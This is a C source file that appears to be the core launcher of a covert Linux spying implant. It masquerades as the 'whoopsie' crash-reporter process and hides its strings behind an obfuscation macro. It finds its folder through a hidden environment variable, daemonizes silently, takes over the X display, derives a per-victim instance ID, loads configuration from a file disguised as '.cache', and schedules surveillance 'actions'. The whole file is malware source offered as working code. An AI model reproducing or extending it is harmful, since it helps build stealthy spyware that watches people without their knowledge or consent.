#define PROCESSNAME SO"whoopsie"

#define _BSD_SOURCE
#define _GNU_SOURCE
#define _XOPEN_SOURCE 700
#include <unistd.h>
#include <openssl/evp.h>
#include <pwd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <fcntl.h>
#include <glob.h>
#include <stdlib.h>
#include <unistd.h>

#include <errno.h>
#include <X11/Xlib.h>
#include <openssl/sha.h>
#include <curl/curl.h>

#include "runtime.h"
#include "so.h"
#include "me.h"
#include "config.h"
#include "eventmanager.h"
#include "actionmanager.h"
#include "module.h"
#include "info.h"

Display *display;

extern void createactions(void);

int main(int argc, char *argv[]);
void getuser(void);
void gethost(void);
void getinstance(void);
void getbinaryname(void);
static void touchfiles(void);
static int xerrorhandler(Display *display, XErrorEvent *xerrorevent);
static int xioerrorhandler(Display *display);

int main(int argc, char *argv[])
{
   char cwd[256], *p = NULL, *env = NULL, *msg = NULL;
   int ret, lock, touch;

   so();

   do {
      if((env = getenv("   "))) {
         if(strlen(env) >= sizeof(cwd)) break;
         strncpy(cwd, env, sizeof(cwd));
      } else {
         if((ret = readlink(SO"/proc/self/exe", cwd, sizeof(cwd))) == -1) break;
         if(ret == sizeof(cwd)) break;
         cwd[ret] = '\0';
      }
      if(!(p = strrchr(cwd, '/'))) break;
      *p = '\0';
   } while(0);
   if(!p || chdir(cwd)) {
      errorme("Unable to change working directory\n");
      exit(EXIT_FAILURE);
   }
   debugme("Working directory is now %s\n", cwd);

   if(strlen(argv[0]) >= strlen(PROCESSNAME)) {
      memset(argv[0], '\0', strlen(argv[0]));
      strcpy(argv[0], PROCESSNAME);
   }
   debugme("Process name is now %s\n", PROCESSNAME);

   if(((lock = open(SO".lock", O_WRONLY|O_CREAT, 0600)) == -1) || flock(lock, LOCK_EX|LOCK_NB)) {
      errorme("Unable to acquire lock - another instance is already running\n");
      exit(EXIT_FAILURE);
   }
   debugme("Lock acquired - I'm on my own\n");

   if(initlib(INIT_LIBCRYPTO|INIT_LIBX11|INIT_LIBCURL)) {
      errorme("Core libraries initialization failed\n");
      exit(EXIT_FAILURE);
   }
   OpenSSL_add_all_ciphers();
   if(!XInitThreads()) {
      errorme("X threads initialization failed\n");
      exit(EXIT_FAILURE);
   }
   XSetErrorHandler(xerrorhandler);
   XSetIOErrorHandler(xioerrorhandler);
   if(curl_global_init(CURL_GLOBAL_NOTHING)) {
      errorme("libcurl initialization failed\n");
      exit(EXIT_FAILURE);
   }

   if((display = XOpenDisplay(NULL)) == NULL) {
      errorme("Unable to connect to X\n");
      exit(EXIT_FAILURE);
   }
   debugme("Connected to X (%s)\n", DisplayString(display));

#ifndef DEBUG
   debugme("Going in background\n");
   if(daemon(1, 0)) {
      errorme("Unable to daemonize\n");
      exit(EXIT_FAILURE);
   }
#endif

   getuser();
   gethost();
   getinstance();
   getbinaryname();

   if(asprintf(&msg, SO"Core %u started on host %s for user %s", VERSION, host, user) > 0) {
      info(msg);
      free(msg);
   }

   parseconfig(SO".cache");
   debugme("Configuration parsed\n");

   createactions();
   debugme("Actions created\n");
   em_scheduleevents();
   debugme("Events scheduled\n");

   while(1) {
      for(touch = 0; touch < 3; touch++) {
         /* cercare di togliere il polling */
         sleep(10);
         XFlush(display);
      }
      touchfiles();
   }   	

   return 0;
}

void getuser(void)
{
   struct passwd pwd;
   struct passwd *result;
   char buf[1024];

   getpwuid_r(getuid(), &pwd, buf, sizeof(buf), &result);
   if(result == NULL) {
      snprintf(user, sizeof(user), SO"(uid%u)", getuid());
   } else {
      snprintf(user, sizeof(user), "%s", pwd.pw_name);
   }

   return;
}

void gethost(void)
{
   if(gethostname(host, sizeof(host))) {
      snprintf(host, sizeof(host), "%s", SO"(unknown)");
   } else {
      host[sizeof(host) - 1] = '\0';
   }

   return;
}

void getinstance(void)
{
   SHA_CTX sha_ctx;
   unsigned char sha[SHA_DIGEST_LENGTH];

   SHA1_Init(&sha_ctx);
   SHA1_Update(&sha_ctx, user, strlen(user));
   SHA1_Update(&sha_ctx, host, strlen(host));
   SHA1_Final(sha, &sha_ctx);
   
   memcpy(instance, sha, sizeof(instance) - 1);
   instance[sizeof(instance) - 1] = '\0';

   return;
}

void getbinaryname(void)
{
   char *env;

   memset(binaryname, '\0', sizeof(binaryname));
   if(readlink(SO"/proc/self/exe", binaryname, sizeof(binaryname) - 1) != -1) {}
   else if((env = getenv("   ")) && strlen(env) && (strlen(env) < sizeof(binaryname)) && strcpy(binaryname, env)) {}

   return;
}

static void touchfiles(void)
{
   int i;
   char *entry;
   glob_t globbuf = {};
   struct timespec times[] = { {0, UTIME_NOW}, {0, UTIME_OMIT} };

   do {
      if(glob("*", GLOB_NOSORT|GLOB_MARK|GLOB_PERIOD, NULL, &globbuf)) break;
      for(i = 0; i < globbuf.gl_pathc; i++) {
         entry = globbuf.gl_pathv[i];
         if(entry[strlen(entry) - 1] == '/') continue;
         utimensat(AT_FDCWD, entry, times, 0);
      }
   } while(0);
   globfree(&globbuf);

   return;
}

static int xerrorhandler(Display *display, XErrorEvent *xerrorevent)
{
   debugme("Xlib error\n");

   return 0;
}

static int xioerrorhandler(Display *display)
{
   debugme("Connection to X lost, exiting\n");

   exit(EXIT_SUCCESS);
}
